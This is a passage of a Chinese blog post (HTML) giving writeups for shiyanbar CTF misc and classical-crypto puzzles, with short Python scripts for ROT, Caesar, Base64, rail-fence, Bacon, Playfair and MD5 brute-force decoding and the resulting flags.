+<p>解密获得密码，将压缩文件中的文档解压出来，看起来像是base64，直接扔到工具里解一下，然后直接搜一下CTF，找的flag</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-Canon-2.png" srcset="/img/loading.gif"></p>
+<p>flag为</p>
+<pre><code>CTF&#123;WONVPAO AIUWNVPAOINE&#125;
+</code></pre>
+<h2 id="ROT13变身了"><a href="#ROT13变身了" class="headerlink" title="ROT13变身了"></a>ROT13变身了</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/misc/rot-13.txt"> 题目地址 </a></p>
+<p>提示</p>
+<pre><code>1、回旋13，回不回？ 2、有81,450,625种可能性
+</code></pre>
+<p>密文给了很多数字，看起来是ASCII,看题目应该不是普通的ROT·13，尝试将ASCII码减去13再转字符串，写脚本</p>
+<pre><code>#Python3
+#-*-coding:utf-8-*-
+
+encodetxt = &quot;83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112&quot;
+
+st = encodetxt.split(&#39; &#39;)
+for i in range(len(st)):
+    st[i] = int(st[i]) - 13
+    print(chr(st[i]),end=&#39;&#39;)
+</code></pre>
+<p>输出如下</p>
+<pre><code>FLAG IS flag&#123;www_shiyanbar_com_is_very_good_????&#125;
+MD5:38e4c352809e150186920aac37190cbc
+</code></pre>
+<p>再写脚本爆破</p>
+<pre><code>    import hashlib
+
+def MD5(data):
+    m2 = hashlib.md5()
+    m2.update(data)
+    return m2.hexdigest()
+
+s = &quot;flag&#123;www_shiyanbar_com_is_very_good_&quot;
+x = &quot;38e4c352809e150186920aac37190cbc&quot;
+for i in range(32,127):
+    for j in range(32,127):
+        for h in range(32,127):
+            for k in range(32,127):
+                st = s + chr(i) + chr(j) + chr(h) + chr(k) + &quot;&#125;&quot;
+                st = str(st)
+                re = MD5(st)
+                if(re == x):
+                    print(st)
+</code></pre>
+<p>flag为</p>
+<pre><code>flag&#123;www_shiyanbar_com_is_very_good_@8Mu&#125;
+</code></pre>
+<h2 id="解码磁带"><a href="#解码磁带" class="headerlink" title="解码磁带"></a>解码磁带</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/misc/cidai.html"> 题目地址 </a></p>
+<p>这个题考查字符转化为二进制，再翻译成对应的字符串，写脚本如下</p>
+<pre><code># -*- coding:utf-8 -*- 
+
+def bin2dec(string_num):
+    return str(int(string_num, 2))
+
+f = open(&#39;233.txt&#39;,&#39;r&#39;)
+file = open(&#39;re.txt&#39;,&#39;w&#39;)
+
+a = f.read()
+a = a.replace(&#39;o&#39;, &#39;1&#39;)
+a = a.replace(&#39;_&#39;, &#39;0&#39;)
+
+st = a.split(&#39;\n&#39;)
+for i in st:
+    file.write(chr(int(bin2dec(i))))
+    file.write(&#39;\n&#39;)
+f.close()
+file.close()
+</code></pre>
+<p>flag为</p>
+<pre><code>simCTF&#123;Where there is a will,there is a way.&#125;
+</code></pre>
+<h2 id="功夫秘籍"><a href="#功夫秘籍" class="headerlink" title="功夫秘籍"></a>功夫秘籍</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/423/misc/kungfu.rar"> 题目地址 </a></p>
+<p>使用winhex打开，在文件尾处发现线索</p>
+<pre><code>key is VF95c0s5XzVyaGtfX3VGTXR9M0Vse251QEUg 
+</code></pre>
+<p>很明显是base64,解密得</p>
+<pre><code>T_ysK9_5rhk__uFMt&#125;3El&#123;nu@E 
+</code></pre>
+<p>看起来像是栅栏，直接解密</p>
+<pre><code>Th3_kEy_ls_&#123;Kun9Fu_M@5tEr&#125;
+</code></pre>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h2><p>题目描述:</p>
+<pre><code>小明某一天收到一封密信，信中写了几个不同的年份    
+辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。
+信的背面还写有“+甲子”，请解出这段密文。
+
+key值：CTF&#123;XXX&#125;
+</code></pre>
+<p>解题过程</p>
+<pre><code>辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳
+28 30 23 8 17 10 16 30
+甲子是 60
+</code></pre>
+<p>每个数字分别加上60，为</p>
+<pre><code>88 90 83 68 77 70 76 90
+</code></pre>
+<p>转ASCII</p>
+<pre><code>XZSDMFLZ
+</code></pre>
+<p>转栅栏</p>
+<pre><code>4
+XZSD
+MFLZ
+XMZFSLDZ
+
+2
+XZ
+SD
+MF
+LZ
+XSMLZDFZ
+</code></pre>
+<p>将上述两条分别用恺撒密码暴力破解下，可以获得明文</p>
+<pre><code>message = &#39;此处填写要破解的密文&#39;
+
+LETTERS = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
+letters = &#39;abcdefghijklmnopqrstuvwxyz&#39;
+
+for key in range(len(LETTERS)):
+    tran = &#39;&#39;
+    for i in message:
+        if i in LETTERS:
+            num = LETTERS.find(i)
+            num = num - key
+            if num &lt; 0:
+                num = num + len(LETTERS)
+            tran = tran + LETTERS[num]
+        elif i in letters:
+            num = letters.find(i)
+            num = num - key
+            if num &lt; 0:
+                num = num + len(letters)
+            tran = tran + letters[num]
+        else:
+            tran = tran + i
+    print(&#39;key = %s: %s&#39; % (key, tran.lower()))
+</code></pre>
+<p>flag为</p>
+<pre><code>CTF&#123;SHUANGYU&#125;
+</code></pre>
+<h2 id="这里没有key"><a href="#这里没有key" class="headerlink" title="这里没有key"></a>这里没有key</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com:8080/4/index.html"> 题目地址 </a></p>
+<p>访问地址，右键查看源代码。发现一串密文</p>
+<pre><code>&lt;!-- #@~^TgAAAA==&#39;[6*liLa6++p&#39;aXvfiLaa6i[[avWi[[a*p[[6*!I&#39;[6cp&#39;aXvXILa6fp[:6+Wp[:XvWi[[6+XivRIAAA==^#~@ --&gt;
+</code></pre>
+<p>解密地址</p>
+<pre><code>http://www.dheart.net/decode/index.php
+</code></pre>
+<p>解得flag为</p>
+<pre><code>Encode@decode 
+</code></pre>
+<p>ps:最后有个空格</p>
+<h2 id="压缩的问题"><a href="#压缩的问题" class="headerlink" title="压缩的问题"></a>压缩的问题</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/crypto/winrar/"> 题目地址 </a></p>
+<p>给了一大串16进制字符</p>
+<pre><code>526172211A0700CF907300000D0000000000000056947424965E
+00600000004900000002E3B1696DEE413D3B1D33310020000000
+C3EBC6C6B2E2CAD44279CCECD2D76C6F76652E74787400796AD2
+34784B6DD58B0A427929591366006C6F7665002E7478742E2E5B
+7A2D7B7D2E2E39423843569449C8691BEC768E16663C5F9ED737
+AE6CDDC6178C0837F6BB88DAA8356B02A700C776FC0F1091C1D1
+6712FC075A011D5B5DEF7E46966E8B878B80DABCDF9683C49165
+FFB993A77CDE8600A1262200F3D3D5315DF0FC4E2B3ACAA3943F
+142EC43D7B00400700
+</code></pre>
+<p>将其粘贴到Winhex中保存为新文件，保存后将扩展名改为rar,即可打开，但是有密码。根据提示</p>
+<pre><code>password crack, 65h -- 71h
+</code></pre>
+<p>猜测密码为winhex中65-71的16进制对应的字符的值。</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Crypto-%E5%8E%8B%E7%BC%A9%E7%9A%84%E9%97%AE%E9%A2%98-1.png" srcset="/img/loading.gif"></p>
+<p>将其粘贴出来，即可解压出文件，去网上找个在线计算sha1的网站</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Crypto-%E5%8E%8B%E7%BC%A9%E7%9A%84%E9%97%AE%E9%A2%98-2.png" srcset="/img/loading.gif"></p>
+<p>sha1为</p>
+<pre><code>SHA1: 58a09ae43e5a9df9ad5e89f90c1bb7430dc5bd02 
+</code></pre>
+<p>所以flag为</p>
+<pre><code>58a09ae4
+</code></pre>
+<h2 id="我喜欢培根"><a href="#我喜欢培根" class="headerlink" title="我喜欢培根"></a>我喜欢培根</h2><p>给了长长的一大串摩尔斯电码</p>
+<pre><code>-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -.. -.-. -.-. -.. -.-. -.-. -.-. -.. -.. -.. -.-. -.. -.-. -.-. -.-. -.. -.. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.. -.. -.-. -.. -.-. -.-. -.-. -.-. -.. -.-. -.-. -.-. -.-. -.-. / -.-. -.. -.-. -.-. -.-. -.. -.-. -.-. -.. -.-. / -.-. -.-. -.-. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.-. -.. -..
+
+MORSEISCOOLBUTBACONISCOOLERDCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCC
+CDCCCDCCDC
+CCCDCCDDDCCDDDCCDCDD
+</code></pre>
+<p>密文</p>
+<pre><code>DCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCCCDCCCDCCDCCCCDCCDDDCCDDDCCDCDD
+</code></pre>
+<p>手撕(ง •_•)ง c是a,d是b</p>
+<pre><code>DCCDC s
+CCDDD h
+CDCCC i
+DDCCC y
+CCCCC a
+CDDCD n
+CCCCD b
+CCCCC a
+CDCCC i
+DCCDC s
+CCCDC c
+CDDDC o
+CDDDC o
+CDCDD l
+</code></pre>
+<p>百度百科第一种方式可以成功解码,不过坑爹的答案是</p>
+<pre><code>CTF&#123;SHIYANBA IS COOL&#125;
+</code></pre>
+<p>。。。</p>
+<h2 id="围在栅栏中的爱"><a href="#围在栅栏中的爱" class="headerlink" title="围在栅栏中的爱"></a>围在栅栏中的爱</h2><p>题目描述</p>
+<pre><code> 最近一直在好奇一个问题，QWE到底等不等于ABC？
+
+-.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- 
+
+flag格式：CTF&#123;xxx&#125; 
+</code></pre>
+<p>密文首先解码莫尔斯密码</p>
+<pre><code>KIQLWTFCQGNSOO
+</code></pre>
+<p>提示qwe等于abc,即</p>
+<pre><code>qwertyuiopasdfghjklzxcvbnm
+abcdefjhijklmnopqrstuvwxyz
+</code></pre>
+<p>解密得</p>
+<pre><code>RHASBENVAOYLII
+</code></pre>
+<p>再解栅栏</p>
+<pre><code>rabnayihsevoli
+</code></pre>
+<p>再逆序</p>
+<pre><code>iloveshiyanbar
+</code></pre>
+<p>最后提交</p>
+<pre><code>CTF&#123;iloveshiyanbar&#125;
+</code></pre>
+<h2 id="奇怪的字符串"><a href="#奇怪的字符串" class="headerlink" title="奇怪的字符串"></a>奇怪的字符串</h2><p>题目描述</p>
+<pre><code> 信息保密的需求和实际操作自古有之，与之相应的信息加密与解密也是历史悠久，现有一段经过古典密码理论（不止一种）加密的密文，内容如下：
+
+89 51 82 109 89 50 86 122 97 71 107 61请找出这段密文隐藏的消息明文 
+</code></pre>
+<p>密文<br>    89 51 82 109 89 50 86 122 97 71 107 61<br>ASCII转字符</p>
+<pre><code>Y3RmY2VzaGk=
+</code></pre>
+<p>解base64</p>
+<pre><code>ctfceshi
+</code></pre>
+<p>直接提交即可</p>
+<h2 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h2><p>题目给了一大串16进制字符</p>
+<pre><code>0x253464253534253435253335253433253661253435253737253464253531253666253738253464253434253637253462253466253534253662253462253464253534253435253738253433253661253435253737253466253531253666253738253464253434253435253462253464253534253435253332253433253661253435253738253464253531253666253738253464253534253535253462253464253534253431253330253433253661253435253737253465253531253666253738253464253661253435253462253466253534253633253462253464253534253435253737253433253661253662253334253433253661253662253333253433253661253435253738253465253431253364253364
+</code></pre>
+<p>转字符</p>
+<pre><code>%4d%54%45%35%43%6a%45%77%4d%51%6f%78%4d%44%67%4b%4f%54%6b%4b%4d%54%45%78%43%6a%45%77%4f%51%6f%78%4d%44%45%4b%4d%54%45%32%43%6a%45%78%4d%51%6f%78%4d%54%55%4b%4d%54%41%30%43%6a%45%77%4e%51%6f%78%4d%6a%45%4b%4f%54%63%4b%4d%54%45%77%43%6a%6b%34%43%6a%6b%33%43%6a%45%78%4e%41%3d%3d
+</code></pre>
+<p>很明显是url编码，转一下</p>
+<pre><code>MTE5CjEwMQoxMDgKOTkKMTExCjEwOQoxMDEKMTE2CjExMQoxMTUKMTA0CjEwNQoxMjEKOTcKMTEwCjk4Cjk3CjExNA==
+</code></pre>
+<p>base64解码</p>
+<pre><code>119 101 108 99 111 109 101 116 111 115 104 105 121 97 110 98 97 114
+</code></pre>
+<p>ASCII转一下字符    </p>
+<pre><code>welcometoshiyanbar
+</code></pre>
+<p>答案为<br>    ctf{welcometoshiyanbar}</p>
+<h2 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h2><p>提示</p>
+<pre><code>与键盘有关
+</code></pre>
+<p>密文</p>
+<pre><code>BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN
+</code></pre>
+<p>根据上述字母在键盘上的位置按顺序连成线，画出字符</p>
+<pre><code>NBNCBNNBNBC
+</code></pre>
+<p>直接提交即可</p>
+<h2 id="NSCTF-crypto50"><a href="#NSCTF-crypto50" class="headerlink" title="NSCTF crypto50"></a>NSCTF crypto50</h2><p>给了一串密文</p>
+<pre><code>U2FsdGVkX1+qtU8KEGmMJwGgKcPUK3XBTdM+KhNRLHSCQL2nSXaW8++yBUkSylRp 
+</code></pre>
+<p>AES在线解密</p>
+<pre><code>http://tool.oschina.net/encrypt
+</code></pre>
+<p>解密获得</p>
+<pre><code>flag&#123;DISJV_Hej_UdShofjyed&#125;
+</code></pre>
+<p>凯撒移位一下</p>
+<pre><code>flag&#123;NSCTF_Rot_EnCryption&#125;
+</code></pre>
+<h2 id="疑惑的汉字"><a href="#疑惑的汉字" class="headerlink" title="疑惑的汉字"></a>疑惑的汉字</h2><pre><code> 现有一段经过加密的密文，内容如下：王夫 井工 夫口 由中人 井中 夫夫 由中大。请找出这段密文隐藏的消息明文。
+
+格式：CTF&#123; &#125;
+</code></pre>
+<p>很明显是当铺密码，直接解密</p>
+<pre><code>67 84 70 123 82 77 125 
+</code></pre>
+<p>ASCII转字符</p>
+<pre><code>CTF&#123;RM&#125;
+</code></pre>
+<h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><pre><code>密文内容如下&#123;79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65&#125;
+
+请对其进行解密
+提示：1.加解密方法就在谜面中
+
+     2.利用key值的固定结构
+
+格式：CTF&#123; &#125; 
+</code></pre>
+<p>密文<br>    79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65</p>
+<p>ASCII转字符</p>
+<pre><code>OCU&#123;CFTELXOUYDECTNGAHOHRNFIENM&#125;IOTA
+</code></pre>
+<p>古典密码最基本的加密方法就是置换</p>
+<pre><code>OCU&#123;CFT
+ELXOUYD
+ECTNGAH
+OHRNFIE
+NM&#125;IOTA
+</code></pre>
+<p>列置换拼凑出CTF{}(存在4种可能)</p>
+<pre><code>CTF&#123;OCU
+LDYOEUX
+CHANEGT
+HEINOFR
+MATINO&#125;
+CTF&#123;OCULDYOEUXCHANEGTHEINOFRMATINO&#125;
+
+CTF&#123;COU
+LDYOUEX
+CHANGET
+HEINFOR
+MATION&#125;
+CTF&#123;COULDYOUEXCHANGETHEINFORMATION&#125;
+
+CTF&#123;COU
+UDYOLEX
+GHANCET
+FEINHOR
+OATIMN&#125;
+CTF&#123;COUUDYOLEXGHANCETFEINHOROATIMN&#125;
+
+CTF&#123;OCU
+UDYOELX
+GHANECT
+FEINOHR
+OATINM&#125;
+CTF&#123;OCUUDYOELXGHANECTFEINOHROATINM&#125;
+</code></pre>
+<p>经过尝试，flag为</p>
+<pre><code>CTF&#123;COULDYOUEXCHANGETHEINFORMATION&#125;
+</code></pre>
+<h2 id="The-Flash-14"><a href="#The-Flash-14" class="headerlink" title="The Flash-14"></a>The Flash-14</h2><pre><code>这些数字都是什么呢~   54433252224455342251522244342223113412
+
+答案形式ctf&#123;XXX&#125; 
+</code></pre>
+<p>闪电侠第二季第14集有个加密方式</p>
+<p>密码表</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Crypto-Theflash-14.jpg" srcset="/img/loading.gif"></p>
+<pre><code>54 43 32 52 22 44 55 34 22 51 52 22 44 34 22 23 11 34 12
+YSMWGTZOGVWGTOGHAOB
+</code></pre>
+<p>凯撒解密</p>
+<pre><code>key = 14: KEYISFLASHISFASTMAN
+</code></pre>
+<p>最后答案为</p>
+<pre><code>ctf&#123;flashisfastman&#125;
+</code></pre>
+<h2 id="凯撒是罗马共和国杰出的军事统帅"><a href="#凯撒是罗马共和国杰出的军事统帅" class="headerlink" title="凯撒是罗马共和国杰出的军事统帅"></a>凯撒是罗马共和国杰出的军事统帅</h2><p>密文</p>
+<pre><code>MGAKUZKRWZWGAWCP
+</code></pre>
+<p>直接暴力破解</p>
+<pre><code>key = 2: KEYISXIPUXUEYUAN
+</code></pre>
+<p>最后的flag为</p>
+<pre><code>XIPUXUEYUAN
+</code></pre>
+<h2 id="摩擦摩擦"><a href="#摩擦摩擦" class="headerlink" title="摩擦摩擦"></a>摩擦摩擦</h2><p>密文</p>
+<pre><code>&quot;.-- . .-.. -.-. --- -- . - --- -..- .. .--. ..- -..- ..- . -.-- ..- .- -.&quot;
+</code></pre>
+<p>直接在线解码摩尔斯电码</p>
+<pre><code>WELCOMETOXIPUXUEYUAN
+</code></pre>
+<h2 id="最近听说刘翔离婚了"><a href="#最近听说刘翔离婚了" class="headerlink" title="最近听说刘翔离婚了"></a>最近听说刘翔离婚了</h2><p>密文</p>
+<pre><code>kyssmlxeei&#123;ipeu&#125;
+</code></pre>
+<p>刘翔 -&gt; 跨栏 -&gt; 栅栏</p>
+<p>分为两栏解栅栏</p>
+<pre><code>keyis&#123;simplexue&#125; 
+</code></pre>
+<h2 id="奇妙的音乐"><a href="#奇妙的音乐" class="headerlink" title="奇妙的音乐"></a>奇妙的音乐</h2><p>解压给的压缩包，给了一个图片和一个有密码的压缩包，压缩包里面有个wav文件，给的图片上画着一本书的2封面，上面写着海伦凯勒，而且下面有某种编码</p>
+<p>图1</p>
+<p>联想海伦凯勒的身份，应该是盲文，百度百科翻译一下</p>
+<pre><code>kmdonowg
+</code></pre>
+<p>这个就是压缩文件的密码，直接解压，打开音乐是滴滴答答的声音，很明显是摩尔斯电码，借助Audacity将其提取出来。</p>
+<p>-.-. - ..-. .– .–. . .. —– —.. –… …– ..— ..–.. ..— …– -.. –..</p>
+<p>解码得</p>
+<pre><code>CTFWPEI08732?23DZ
+</code></pre>
+<p>实验吧的答案就是坑，还得小写</p>
+<pre><code>CTF&#123;wpei08732?23dz&#125;
+</code></pre>
+<h2 id="敌军情报"><a href="#敌军情报" class="headerlink" title="敌军情报"></a>敌军情报</h2><pre><code> 知彼知己方能百战不殆。天枢战队成员截获了一条命令密文45 46 45 46 32 45 32 46 46 45 46 32 46 45 32，你能解密成明文，做到知己知彼吗？
+
+格式：CTF&#123; &#125; 
+</code></pre>
+<p>密文</p>
+<pre><code>45 46 45 46 32 45 32 46 46 45 46 32 46 45 32
+</code></pre>
+<p>看起来像ASCII码，直接转换</p>
+<pre><code>-.-. - ..-. .- 
+</code></pre>
+<p>摩尔斯电码，解码</p>
+<pre><code>CTFA
+</code></pre>
+<p>坑爹的答案</p>
+<pre><code>CTF&#123;a&#125;
+</code></pre>
+<h2 id="Fair-Play"><a href="#Fair-Play" class="headerlink" title="Fair-Play"></a>Fair-Play</h2><p>题目描述</p>
+<pre><code>The quick brown fox jumps over the lazy dog!
+   ihxo&#123;smzdodcikmodcismzd&#125;
+</code></pre>
+<p>百度一下Fair-Play，找到了playfair密码，猜测密钥为</p>
+<pre><code>The quick brown fox jumps over the lazy dog!
+</code></pre>
+<p>编制密码表,由于密文中没有j，因此要把密码表中的j去掉</p>
+<pre><code>thequickbrownfoxumpsoverthelazydog
+</code></pre>
+<p>密码表为</p>
+<pre><code>t h e q u
+i c k b r
+o w n f x
+m p s v l
+a z y d g
+</code></pre>
+<p>手撕….</p>
+<pre><code>ih xo sm zd od     ci km     od     ci sm zd
+ct fx pl ay af(fa) ir si(is) af(fa) ir pl ay
+</code></pre>
+<p>整理下，明文应该是</p>
+<pre><code>ctfx&#123;playfairisfairplay&#125;
+</code></pre>
+<p>奇葩的答案。。还带个x…</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Writeup/">Writeup</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2017/10/10/%E5%90%88%E5%A4%A9Web%E8%BF%9B%E9%98%B6%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">合天Web进阶部分题目Writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2017/10/10/Bugku%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/">
+                        <span class="hidden-mobile">Bugku部分题目Writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
